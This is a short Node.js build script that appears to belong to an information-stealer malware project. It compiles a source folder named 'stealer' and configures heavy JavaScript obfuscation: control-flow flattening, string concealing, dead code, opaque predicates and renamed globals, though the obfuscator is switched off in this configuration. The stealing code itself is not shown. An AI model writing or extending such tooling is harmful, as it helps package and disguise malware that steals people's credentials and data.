const path = require('path');

const { Builder } = require('./structures/builder.js');

const builder = new Builder({
  sourceDir: path.join(__dirname, '..', 'stealer'),
  isEnableConfuser: false,
  confuserOptions: {
    target: 'node',
    controlFlowFlattening: 1,
    minify: true,
    globalConcealing: true,
    stringCompression: 1,
    stringConcealing: 1,
    stringEncoding: 0.5,
    stringSplitting: 1,
    deadCode: 1,
    calculator: 0.7,
    compact: true,
    movedDeclarations: true,
    objectExtraction: true,
    stack: true,
    duplicateLiteralsRemoval: 1,
    flatten: true,
    dispatcher: true,
    opaquePredicates: 1,
    shuffle: { hash: 0.8, true: 0.8 },
    renameVariables: true,
    renameGlobals: true,
  },
});

builder.start();
